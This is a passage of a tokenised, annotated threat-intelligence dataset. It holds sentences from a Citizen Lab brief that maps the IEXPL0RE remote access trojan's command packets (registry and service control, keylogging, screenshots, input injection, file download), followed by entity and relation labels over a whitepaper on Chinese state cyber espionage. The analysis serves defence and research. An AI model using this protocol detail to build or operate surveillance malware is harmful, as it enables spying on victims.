"-", "Binary", "path", "name", "length"], ["[var]", "-", "Binary", "path", "name"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(set", "by", "ChangeServiceConfig2A())"], ["[4]", "-", "Start", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "5/5", ".", "If", "success", ",", "contains", "the", "following", "payload:"], ["[4]", "-", "Service", "handle"], ["[4]", "-", "Current", "state"], ["[4]", "-", "Start", "type"], ["[4]", "-", "Error", "control"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Length", "of", "service", "display", "name"], ["[var]", "-", "Service", "display", "name"], ["[4]", "-", "Length", "of", "service", "binary", "path"], ["[var]", "-", "Service", "binary", "path"], ["[4]", "-", "Length", "of", "service", "description"], ["[var]", "-", "Service", "description"], ["[4]", "-", "Length", "of", "service", "start", "name"], ["[var]", "-", "Service", "start", "name"], ["0x89"], ["Delete", "service"], ["S"], ["Deletes", "a", "service", "from", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "name", "length"], ["[var]", "-", "Service", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "5/5", "."], ["0x8A"], ["Set", "service", "options"], ["S"], ["Changes", "the", "display", "name", "and", "start", "type", "of", "a", "service", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "name", "length"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(max", "256", "chars)"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(max", "512", "chars)"], ["[4]", "-", "Service", "start", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "5/Res2"], ["0x96"], ["Enumerate", "registry"], ["keys"], ["S"], ["Opens", "a", "registry", "key", "and", "enumerates", "its", "subkeys", ".", "Replies", "with", "an", "0x97"], ["packet", "with", "subkey", "information", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x97"], ["Enumerate", "registry"], ["keys", "response"], ["C"], ["27"], ["Contains", "a", "list", "of", "all", "the", "subkey", "names", "for", "a", "given", "registry", "key", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "subkeys", "(N)"], ["[var", ",", "N", "times]", ":", "[4]", "-", "Subkey", "name", "length"], ["[var]", "-", "Subkey", "name"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x98"], ["Registry", "key", "last", "write"], ["time", "query"], ["S"], ["Requests", "the", "last", "write", "time", "on", "a", "specified", "registry", "key", "and", "returns", "the", "information", "in", "a", "0x99", "packet", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["0x99"], ["Registry", "key", "last", "write"], ["time", "response"], ["C"], ["Contains", "the", "last", "write", "time", "of", "a", "registry", "key", "."], ["Packet", "contains:"], ["[8]", "-", "Last", "write", "time", "(_FILETIME", "structure)"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9A"], ["Enumerate", "registry", "key"], ["values"], ["S"], ["Opens", "a", "registry", "key", "and", "enumerates", "its", "values", ".", "Replies", "with", "a", "0x9B", "packet"], ["with", "the", "number", "of", "values", "and", "maximum", "size", "values", ".", "Sends", "a", "0x9C", "packet"], ["for", "each", "value", ",", "then", "signifies", "the", "end", "of", "the", "list", "with", "a", "0x9D", "packet", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["0x9B"], ["Start", "of", "registry", "key"], ["value", "enumeration", "list"], ["C"], ["Response", "to", "the", "0x9A", "command", "signifying", "the", "start", "of", "a", "registry", "key", "value"], ["enumeration", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "values", "associated", "with", "the", "registry", "key"], ["[4]", "-", "Max", "value", "name", "length"], ["[4]", "-", "Max", "value", "length"], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9C"], ["Registry", "key", "value", "enumeration", "item"], ["C"], ["Response", "to", "the", "0x9A", "command", "signifying", "a", "registry", "key", "value", "."], ["Packet", "contains:"], ["[4]", "-", "Type"], ["[4]", "-", "Value", "name", "size"], ["[var]", "-", "Value", "name"], ["[4]", "-", "Value", "data", "size"], ["[var]", "-", "Value", "data"], ["Parameters", "are", "set", "to", "6/6", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x9D"], ["End", "of", "registry", "key"], ["value", "enumeration", "list"], ["C"], ["Response", "to", "the", "0x9A", "command", "signifying", "the", "end", "of", "a", "registry", "key", "value"], ["enumeration", "."], ["Parameters", "are", "set", "to", "6/6", "."], ["0x9F"], ["Delete", "registry", "key"], ["value"], ["S"], ["Deletes", "a", "value", "from", "a", "registry", "key", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "key", "value", "length"], ["[var]", "-", "Registry", "key", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA0"], ["Change", "registry", "key"], ["value"], ["S"], ["Changes", "a", "value", "of", "a", "registry", "key", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "key", "old", "value", "length"], ["[var]", "-", "Registry", "key", "old", "value"], ["[4]", "-", "Registry", "key", "new", "value", "length"], ["[var]", "=", "Registry", "key", "new", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA1"], ["Create", "empty", "registry"], ["key", "value"], ["S"], ["Creates", "a", "registry", "key", "value", "of", "a", "specified", "type", "with", "no", "value", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "key", "value", "name", "length"], ["[var]", "-", "Registry", "key", "value", "name"], ["[4]", "-", "Registry", "key", "value", "type"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["0xA2"], ["Create", "registry", "key"], ["S"], ["Creates", "a", "registry", "key", ".", "Can", "be", "a", "subkey", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "set", "to", "6/6", "."], ["28"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0xA3"], ["Set", "registry", "key", "type"], ["and", "value"], ["S"], ["Sets", "a", "registry", "key", "type", "and", "value", "."], ["Packet", "always", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["[4]", "-", "Registry", "value", "name", "length"], ["[var]", "-", "Registry", "value", "name"], ["[4]", "-", "Registry", "value", "type"], ["The", "value", "then", "can", "take", "a", "different", "form", "based", "on", "the", "value", "type", "."], ["Value", "type", "0", "(empty):"], ["No", "payload", "."], ["Value", "type", "1", "(REG_SZ", ",", "null", "terminated", "string):"], ["[4]", "-", "Registry", "value", "length"], ["[var]", "-", "Registry", "value"], ["Value", "type", "3", "(REG_BINARY", ",", "raw", "binary", "data):"], ["[4]", "-", "Registry", "value", "length"], ["[var]", "-", "Registry", "value"], ["Value", "type", "4", "(REG_DWORD", ",", "double", "word):"], ["[4]", "-", "Registry", "value"], ["Returns", "success", "or", "failure", "with", "parameters", "6/6", "."], ["0xA4"], ["NOP"], ["S"], ["Does", "nothing", ".", "Possibly", "an", "unimplemented", "or", "deleted", "function", "."], ["0xA5"], ["Delete", "registry", "key"], ["S"], ["Deletes", "a", "registry", "key", ".", "Can", "be", "a", "subkey", "."], ["Packet", "contains:"], ["[4]", "-", "Registry", "key", "name", "length"], ["[var]", "-", "Registry", "key", "name"], ["Returns", "success", "or", "failure", "with", "parameters", "6/6", "."], ["0xB6"], ["Keylogger", "response"], ["C"], ["Sends", "keylogger", "data", "from", "the", "keylogger", "buffer", "file", "."], ["Keylogger", "data:"], ["[4]", "-", "Length"], ["[1]", "-", "All", "bytes", "read", "?", "1", "or", "0"], ["[var]", "-", "Keylogger", "data"], ["Parameters", "are", "set", "to", "the", "output", "of", "function", "4", "in", "the", "class", "C", "vtable", "?"], ["0xB8"], ["Keylogger", "data", "request"], ["S"], ["Requests", "keylogger", "data", "in", "a", "0xB6", "packet", "."], ["29"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0xC8"], ["Unknown", "-", "get", "a", "screenshot", "?"], ["S"], ["30"], ["Looks", "suspiciously", "like", "taking", "a", "screenshot", "."], ["Packet", "contains:"], ["[2]", "-", "Unknown"], ["[2]", "-", "Unknown"], ["[1]", "-", "Unknown"], ["Replies", "with", "failure", "or", "success", "with", "parameters", "8/8", ".", "If", "success", ",", "contains", "the"], ["following", "fields:"], ["[2]", "-", "Monitor", "width", "size", "(X)", "in", "pixels"], ["[2]", "-", "Monitor", "height", "size", "(Y)", "in", "pixels"], ["[4]", "-", "Unknown"], ["[4]", "-", "Unknown", "size", "(screenshot", "?", ")"], ["[var]", "-", "Unknown", "(screenshot", "?", ")"], ["0xCA"], ["Send", "keyboard", "or"], ["mouse", "event"], ["S"], ["Packet", "contains:"], ["[4]", "-", "Unknown"], ["[4]", "-", "Extra", "information", "for", "keybd_event", "or", "mouse_event"], ["[4]", "-", "Flags", "for", "keybd_event", "or", "mouse_event"], ["[4]", "-", "Vk", "for", "keybd_event"], ["[4]", "-", "x", "coordinate", "for", "mouse", "or", "Vk", "for", "keyboard"], ["[4]", "-", "y", "coordinate", "for", "mouse"], ["[4]", "-", "Data", "for", "mouse", "event"], ["0xCB"], ["Downloads", "a", "file"], ["S"], ["Downloads", "a", "file", "to", "%temp%\\off", ".", "dll."], ["Packet", "contains:"], ["[2]", "-", "Unknown"], ["[2]", "-", "Unknown"], ["[2]", "-", "Unknown"], ["[4]", "-", "Data", "length"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown"], ["[4]", "-", "File", "data", "length"], ["[var]", "-", "File", "data"], ["Writes", "log", "information", "on", "the", "size", "of", "the", "downloaded", "file", "to", "c:\\aaa\\ccc", ".", "txt."]]}], [{"vertexSet": [{"old_id": "T1", "type": "ThreatActor", "name": "Chinese government", "sent_id": 121, "pos": [8, 9]}, {"old_id": "T2", "type": "Country", "name": "China", "sent_id": 128, "pos": [3]}, {"old_id": "T3", "type": "Exploit", "name": "zero day", "sent_id": 141, "pos": [12, 13]}, {"old_id": "T4", "type": "FinancialInformation", "name": "economics", "sent_id": 161, "pos": [9]}, {"old_id": "T5", "type": "Information", "name": "trade and human rights", "sent_id": 161, "pos": []}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "government departments", "sent_id": 162, "pos": [5, 6]}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "embassies", "sent_id": 162, "pos": [8]}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "NGOs", "sent_id": 162, "pos": [13]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "UN", "sent_id": 163, "pos": [7]}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "G20", "sent_id": 163, "pos": [9]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "World Bank", "sent_id": 163, "pos": [11, 12]}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "IMF", "sent_id": 163, "pos": [14]}, {"old_id": "T13", "type": "Organization", "name": "Centre for the Protection of National Infrastructure", "sent_id": 179, "pos": []}, {"old_id": "T14", "type": "Organization", "name": "FBI", "sent_id": 180, "pos": []}, {"old_id": "T15", "type": "CourseOfAction", "name": "anti-virus", "sent_id": 204, "pos": [3]}, {"old_id": "T16", "type": "CourseOfAction", "name": "firewalls", "sent_id": 204, "pos": [5]}, {"old_id": "T17", "type": "CourseOfAction", "name": "penetration testing", "sent_id": 207, "pos": [5, 6]}, {"old_id": "T18", "type": "File", "name": "Adobe PDF", "sent_id": 253, "pos": [1, 2]}, {"old_id": "T19", "type": "File", "name": "Microsoft Office document", "sent_id": 253, "pos": []}, {"old_id": "T20", "type": "Software", "name": "Internet Explorer", "sent_id": 257, "pos": [1, 2]}, {"old_id": "T21", "type": "Software", "name": "Firefox", "sent_id": 257, "pos": [4]}, {"old_id": "T22", "type": "Country", "name": "Japan", "sent_id": 275, "pos": [2]}, {"old_id": "T23", "type": "Country", "name": "Taiwan", "sent_id": 275, "pos": [4]}, {"old_id": "T24", "type": "Country", "name": "Tibet", "sent_id": 275, "pos": [9]}, {"old_id": "T25", "type": "Country", "name": "Mongolia", "sent_id": 275, "pos": [11]}, {"old_id": "T26", "type": "Country", "name": "US", "sent_id": 277, "pos": [0]}, {"old_id": "T27", "type": "Country", "name": "Russia", "sent_id": 277, "pos": [2]}, {"old_id": "T28", "type": "Country", "name": "UK", "sent_id": 277, "pos": [5]}, {"old_id": "T29", "type": "Country", "name": "Germany", "sent_id": 277, "pos": [7]}, {"old_id": "T30", "type": "Country", "name": "France", "sent_id": 277, "pos": [9]}, {"old_id": "T31", "type": "Country", "name": "India", "sent_id": 277, "pos": []}, {"old_id": "T32", "type": "Attacker", "name": "China", "sent_id": 272, "pos": [11]}, {"old_id": "T33", "type": "Attacker", "name": "China", "sent_id": 278, "pos": [1]}, {"old_id": "T34", "type": "Country", "name": "Brazil", "sent_id": 278, "pos": [3]}, {"old_id": "T35", "type": "Country", "name": "Iran", "sent_id": 278, "pos": [5]}, {"old_id": "T36", "type": "Location", "name": "Australia", "sent_id": 278, "pos": [7]}, {"old_id": "T37", "type": "ExploitTargetObject", "name": "separatist Uighurs", "sent_id": 286, "pos": [2, 3]}, {"old_id": "T38", "type": "ExploitTargetObject", "name": "Tibetan separatists", "sent_id": 286, "pos": []}, {"old_id": "T39", "type": "ExploitTargetObject", "name": "pro-democracy supporters", "sent_id": 287, "pos": [2, 3]}, {"old_id": "T40", "type": "ExploitTargetObject", "name": "supporters of an independent Taiwan", "sent_id": 287, "pos": [3, 9]}, {"old_id": "T41", "type": "ExploitTargetObject", "name": "Falun Gong", "sent_id": 288, "pos": [4, 5]}, {"old_id": "T42", "type": "Exploit", "name": "passive email attacks", "sent_id": 305, "pos": [9, 11]}, {"old_id": "T43", "type": "Attacker", "name": "China", "sent_id": 303, "pos": [0]}, {"old_id": "T44", "type": "Campaign", "name": "Aurora", "sent_id": 313, "pos": []}, {"old_id": "T45", "type": "Organization", "name": "Google", "sent_id": 313, "pos": [11]}, {"old_id": "T46", "type": "Organization", "name": "Adobe", "sent_id": 313, "pos": [13]}, {"old_id": "T47", "type": "Organization", "name": "Juniper", "sent_id": 313, "pos": [15]}, {"old_id": "T48", "type": "Organization", "name": "Northrup Grumman", "sent_id": 313, "pos": []}, {"old_id": "T49", "type": "Campaign", "name": "Night Dragon", "sent_id": 314, "pos": []}, {"old_id": "T50", "type": "ExploitTargetObject", "name": "energy sector", "sent_id": 315, "pos": []}, {"old_id": "T51", "type": "Campaign", "name": "Shady RAT", "sent_id": 315, "pos": []}, {"old_id": "T52", "type": "ExploitTargetObject", "name": "steel industry", "sent_id": 315, "pos": []}, {"old_id": "T53", "type": "ExploitTargetObject", "name": "heavy engineering", "sent_id": 316, "pos": [2, 3]}, {"old_id": "T54", "type": "ExploitTargetObject", "name": "construction", "sent_id": 316, "pos": [5]}, {"old_id": "T55", "type": "ExploitTargetObject", "name": "communications companies", "sent_id": 316, "pos": [7, 8]}, {"old_id": "T56", "type": "ExploitTargetObject", "name": "RSA", "sent_id": 320, "pos": []}, {"old_id": "T57", "type": "AccountAuthenticationInformation", "name": "SecurID tokens", "sent_id": 321, "pos": [9, 10]}, {"old_id": "T58", "type": "Organization", "name": "Lockheed Martin", "sent_id": 325, "pos": [5, 6]}, {"old_id": "T59", "type": "Attacker", "name": "People\u2019s Liberation Army", "sent_id": 377, "pos": [7, 9]}, {"old_id": "T60", "type": "ExploitTargetObject", "name": "Pentagon", "sent_id": 383, "pos": [16]}, {"old_id": "T61", "type": "Malware", "name": "Stuxnet", "sent_id": 397, "pos": []}, {"old_id": "T62", "type": "MalwareFamily", "name": "Five Poisons", "sent_id": 558, "pos": [2, 3]}, {"old_id": "T63", "type": "AttackerGroup", "name": "3PLA", "sent_id": 685, "pos": []}, {"old_id": "T64", "type": "Organization", "name": "COMAC", "sent_id": 785, "pos": [0]}, {"old_id": "T65", "type": "Organization", "name": "Commercial Aircraft Corporation of China", "sent_id": 784, "pos": [11, 15]}, {"old_id": "T66", "type": "Organization", "name": "Parker Aerospace", "sent_id": 796, "pos": []}, {"old_id": "T67", "type": "Organization", "name": "General Electric", "sent_id": 797, "pos": [2, 3]}, {"old_id": "T68", "type": "Organization", "name": "Honeywell", "sent_id": 797, "pos": [5]}, {"old_id": "T69", "type": "Organization", "name": "Goodrich", "sent_id": 797, "pos": [7]}, {"old_id": "T70", "type": "TechnologyInformation", "name": "designs for the body of the aircraft", "sent_id": 838, "pos": [1, 7]}, {"old_id": "T71", "type": "TechnologyInformation", "name": "aerodynamic information", "sent_id": 838, "pos": [13, 14]}, {"old_id": "T72", "type": "TechnologyInformation", "name": "engine designs", "sent_id": 839, "pos": [14, 15]}], "labels": [{"old_id": "R1", "r": "P32", "h": 31, "t": 21, "evidence": [272, 273, 274, 275]}, {"old_id": "R2", "r": "P32", "h": 31, "t": 22, "evidence": [272, 273, 274, 275]}, {"old_id": "R3", "r": "P32", "h": 31, "t": 23, "evidence": [272, 273, 274, 275]}, {"old_id": "R4", "r": "P32", "h": 31, "t": 24, "evidence": [272, 273, 274, 275]}, {"old_id": "R5", "r": "P32", "h": 31, "t": 25, "evidence": [272, 273, 274, 275, 276, 277]}, {"old_id": "R6", "r": "P32", "h": 31, "t": 26, "evidence": [272, 273, 274, 275, 276, 277]}, {"old_id": "R7", "r": "P32", "h": 31, "t": 27, "evidence": [272, 273, 274, 275, 276, 277]}, {"old_id": "R8", "r": "P32", "h": 32, "t": 28, "evidence": []}, {"old_id": "R9", "r": "P32", "h": 32, "t": 29, "evidence": []}, {"old_id": "R10", "r": "P32", "h": 32, "t": 30, "evidence": []}, {"old_id": "R11", "r": "P32", "h": 32, "t": 35, "evidence": [278]}, {"old_id": "R12", "r": "P32", "h": 32, "t": 33, "evidence": [278]}, {"old_id": "R13", "r": "P32", "h": 32, "t": 34, "evidence": [278]}, {"old_id": "R14", "r": "P23", "h": 42, "t": 41, "evidence": [303, 304, 305]}, {"old_id": "R15", "r": "P27", "h": 43, "t": 44, "evidence": [313]}, {"old_id": "R16", "r": "P27", "h": 43, "t": 45, "evidence": [313]}, {"old_id": "R17", "r": "P27", "h": 43, "t": 46, "evidence": [313]}, {"old_id": "R18", "r": "P27", "h": 43, "t": 47, "evidence": [313]}, {"old_id": "R19", "r": "P27", "h": 48, "t": 49, "evidence": [314, 315]}, {"old_id": "R20", "r": "P27", "h": 50, "t": 51, "evidence": [315]}, {"old_id": "R21", "r": "P27", "h": 50, "t": 52, "evidence": [315, 316]}, {"old_id": "R22", "r": "P27", "h": 50, "t": 53, "evidence": [315, 316]}, {"old_id": "R23", "r": "P27", "h": 50, "t": 54, "evidence": [315, 316]}], "title": ["inputs/txt/201203ContextInformationSecurityCrouchingTiger"], "sents": [["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Crouching", "Tiger", ","], ["Hidden", "Dragon", ","], ["Stolen", "Data"], ["Context", "Information", "Security"], ["whitepapers@contextis", ".", "com"], ["March", "2012"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["1", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Contents"], ["Executive", "Summary"], ["3"], ["Introduction"], ["4"], ["Categorising", "Attacks"], ["5"], ["Why", "Cyber", "?"], ["6"], ["How", "Cyber", "?"], ["7"], ["The", "Targets"], ["7"], ["The", "Requirements"], ["9"], ["Boosting", "Domestic", "Enterprise"], ["11"], ["At", "Risk"], ["12"], ["How", "Does", "it", "Happen", "?"], ["14"], ["Setting", "Requirements"], ["14"], ["Planning", "and", "Direction"], ["15"], ["Collection"], ["15"], ["Processing", "and", "Exploitation"], ["15"], ["Analysis", "and", "Production"], ["15"], ["Dissemination"], ["16"], ["The", "Scale", "of", "the", "Operation"], ["17"], ["Profiting", "from", "the", "Product"], ["18"], ["Hypothetical", "Case", "Study:", "Aircraft", "Construction"], ["19"], ["Conclusion"], ["21"], ["About", "Context"], ["23"], ["Appendix"], ["24"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["2", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Executive", "Summary"], ["Media", "reports", "show", "that", "targeted", "cyber", "attacks", "against", "government", "and", "commerce", "have"], ["been", "ongoing", "since", "at", "least", "2003", "and", "possibly", "some", "time", "before", "that", ".", "By", "far", "the", "largest"], ["sponsor", "of", "these", "attacks", "is", "the", "Chinese", "state", ".", "This", "is", "not", "a", "new", "problem;", "it", "is", "espionage", "with", "a"], ["different", "methodology", "."], ["These", "attacks", "are", "far", "from", "random", "or", "indiscriminate", ".", "These", "attacks", "are", "designed", "to", "steal"], ["information", "that", "will", "fulfil", "a", "clear", "set", "of", "requirements", "set", "by", "the", "Chinese", "state", "and", "furnish"], ["them", "with", "political", ",", "commercial", "and", "security/intelligence", "information", ".", "These", "requirements"], ["are", "carefully", "and", "clearly", "identified", ",", "shared", "with", "a", "number", "of", "government", "departments", "and"], ["constantly", "updated", ".", "There", "is", "evidence", "of", "worldwide", "targeting", "but", "only", "a", "minority", "of", "attacks"], ["are", "identified", "and", "fewer", "still", "made", "public", "."], ["This", "is", "a", "structured", "program", "and", "the", "main", "protagonists", "in", "China", "are", "widely", "believed", "to", "be"], ["the", "Third", "Department", "of", "the", "People\u2019s", "Liberation", "Army", ".", "Even", "using", "conservative", "estimates", "it", "is"], ["likely", "that", "the", "program", "employs", "thousands", "of", "military", "personnel", ".", "While", "the", "military", "program"], ["may", "be", "the", "most", "developed", "and", "sophisticated", ",", "it", "is", "likely", "that", "other", "parts", "of", "the", "Chinese"], ["state", "and", "even", "the", "private", "sector", "may", "also", "be", "carrying", "out", "similar", "attacks", "."], ["There", "are", "clues", "to", "the", "companies", "and", "types", "of", "data", "most", "at", "risk", ".", "In", "particular", "the", "Five", "Year"], ["Plan1", "and", "the", "National", "Outline", "for", "Medium", "and", "Long", "Term", "S&T", "Development2", "give", "detail", "on"], ["the", "areas", "in", "which", "China", "intends", "to", "excel", "and", "identifies", "specific", "technology", "which", "the"], ["Chinese", "want", "to", "develop", "or", "otherwise", "acquire", ".", "Electronics", ",", "telecoms", ",", "manufacturing", ","], ["extraction", ",", "energy", ",", "biotech", ",", "pharmaceuticals", ",", "aerospace", ",", "space", "and", "defence", "are", "sectors"], ["at", "the", "highest", "risk", ",", "alongside", "companies", "and", "services", "such", "as", "law", "and", "accountancy", "firms"], ["that", "support", "them", "and", "hold", "their", "data", "."], ["The", "likely", "recipients", "of", "stolen", "commercial", "data", "are", "the", "117", "Chinese", "State", "Owned", "Enterprises"], ["that", "dominate", "the", "economy", ".", "These", "companies", "are", "closely", "linked", "to", "the", "state", "and", "the"], ["Communist", "Party", "which", "has", "power", "over", "strategy", ",", "senior", "management", "and", "even", "wages", "."], ["Companies", "with", "SOE", "competitors", "should", "be", "especially", "concerned", "about", "data", "security", "."], ["Two", "factors", "make", "western", "governments", "and", "companies", "more", "vulnerable", "to", "Chinese"], ["targeted", "cyber", "attacks", ".", "Firstly", ",", "there", "is", "reluctance", "for", "governments", "and", "companies", "to"], ["accuse", "China", "directly", "or", "take", "any", "form", "of", "action", "for", "fear", "of", "either", "being", "isolated", "politically"], ["or", "being", "blocked", "from", "a", "lucrative", "developing", "market", ".", "Secondly", ",", "a", "long", "term", "reliance", "on"], ["traditional", "security", "products", "such", "as", "anti-virus", ",", "coupled", "with", "a", "lack", "of", "education", "about", "the"], ["threat", ",", "leaves", "businesses", "vulnerable", "to", "attack", "and", "unprepared", "for", "any", "investigations", "that"], ["are", "required", "in", "the", "aftermath", "of", "a", "compromise", "."], ["Context", "has", "extensive", "experience", "of", "detecting", "and", "investigating", "targeted", "attacks", "and"], ["working", "with", "clients", "to", "help", "protect", "their", "data", "."], ["1"], ["Chinese", "Government", "Official", "Web", "Portal", "website"], ["2"], ["China", "International", "Science", "and", "Technology", "Cooperation", "website"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["3", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Introduction"], ["There", "have", "been", "many", "media", "reports", "in", "recent", "years", "about", "cyber", "attacks", "on", "governments"], ["and", "a", "variety", "of", "private", "sector", "companies", ".", "The", "rather", "ambiguous", "term", "\u2018Advanced", "Persistent"], ["Threat\u20193", "(\u2018APT\u2019)", "is", "widely", "used", "to", "describe", "any", "attack", "that", "appears", "to", "have", "compromised"], ["computers", "in", "these", "companies", "or", "organisations", ",", "regardless", "of", "the", "source", "or", "purpose", "of", "the"], ["attack", ".", "We", "prefer", "simply", "to", "call", "them", "\u2018targeted", "attacks\u2019", "and", "leave", "marketing", "terms", "to", "one"], ["side", ".", "This", "paper", "is", "not", "concerned", "with", "the", "technical", "aspects", "of", "targeted", "attacks", ",", "it", "seeks"], ["instead", "to", "inform", "readers", "about", "the", "full", "scope", "and", "nature", "of", "these", "attacks", ",", "the", "reasons", "why"], ["they", "are", "launched", "and", "the", "people", "and", "policies", "behind", "their", "design", "and", "execution", "."], ["Many", "reports", "of", "attacks", "inevitably", "end", "by", "asking", "\u2018who", "did", "it", "?", "\u2019", "But", "the", "answer", "is", "rarely"], ["straightforward", ".", "Western", "Governments", "usually", "allege", "the", "attacks", "come", "from", "\u2018Asia\u2019", "or", "the"], ["\u2018Far", "East\u2019", ",", "rather", "than", "risk", "offending", "the", "Chinese", "government", ".", "Large", "corporations", "are"], ["similarly", "vague", "in", "their", "descriptions", "of", "these", "events", ",", "for", "fear", "of", "harming", "lucrative", "business"], ["arrangements", ".", "Security", "\u2018experts\u2019", "always", "caution", "that", "IP", "addresses", "can", "be", "used", "as", "hop"], ["points", "through", "which", "attackers", "disguise", "their", "true", "origins", ",", "so", "perhaps", "this", "could", "be", "a", "case", "of"], ["other", "countries", "trying", "to", "make", "it", "look", "as", "if", "China", "was", "the", "source", ".", "While", "this", "is", "true", ",", "if"], ["something", "looks", ",", "walks", "and", "quacks", "like", "a", "duck", ",", "it", "is", "almost", "always", "a", "duck", "."], ["We", "will", "not", "be", "so", "coy", ".", "This", "paper", "will", "look", "directly", "at", "the", "most", "prolific", "sponsor", "of", "computer"], ["network", "exploitation", "attacks:", "China", ".", "We", "know", "other", "countries", "have", "implemented", "similar"], ["programs", "for", "attacking", "computer", "networks", "and", "have", "seen", "many", "examples", "of", "these", "in", "our"], ["work", "over", "the", "last", "few", "years", ",", "but", "our", "focus", "here", "is", "China", "."], ["We", "will", "examine", "various", "aspects", "of", "these", "attacks", ",", "including", "the", "nature", "of", "the", "information"], ["targeted", "and", "the", "types", "of", "organisations", "threatened", ".", "We", "will", "consider", "the", "effort", "involved", "in"], ["planning", ",", "executing", "and", "managing", "these", "attacks;", "and", "assess", "the", "information", "products", "they"], ["generate", ",", "in", "order", "to", "understand", "the", "scale", "of", "human", "involvement", "and", "the", "government"], ["policies", "that", "sponsor", "information", "theft", "via", "targeted", "attacks", ".", "With", "all", "this", "in", "mind", "we", "will", "then"], ["postulate", "on", "where", "the", "stolen", "information", "goes", "and", "how", "it", "may", "be", "used", "."], ["Advanced", "Persistent", "Threat", "has", "recently", "become", "a", "catch", "all", "term", "for", "targeted", "attacks"], ["against", "computer", "networks", "and", "is", "often", "used", "to", "describe", "the", "malware", ".", "In", "fact", ",", "the", "term", "was"], ["first", "coined", "by", "the", "United", "States", "Air", "Force", "in", "2006", ",", "specifically", "to", "refer", "to", "China", "\u2013", "without"], ["actually", "saying", "China", ".", "\u2018Advanced\u2019", "because", "the", "attackers", "could", "use", "a", "variety", "of", "attacks", "to"], ["get", "access", "to", "a", "network", "and", "could", "raise", "their", "game", "to", "use", "zero", "day", "vulnerabilities", "if"], ["necessary;", "\u2018Persistent\u2019", "because", "the", "attacks", "would", "not", "stop", "until", "the", "attacker", "had", "achieved"], ["their", "objectives;", "and", "\u2018Threat\u2019", "because", "this", "attack", "was", "not", "automated", "like", "a", "botnet", ",", "but", "was"], ["conducted", "by", "humans", "who", "adapt", "and", "evolve", "their", "methods", "to", "evade", "defences", "."], ["3"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["4", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Categorising", "Attacks"], ["Many", "commentators", "have", "divided", "the", "targets", "of", "attacks", "into", "four", "categories:", "political", ","], ["economic", ",", "technical", "and", "military", ".", "This", "works", "as", "a", "general", "model", ",", "but", "focuses", "on", "the", "target"], ["of", "the", "attack", "as", "a", "whole", 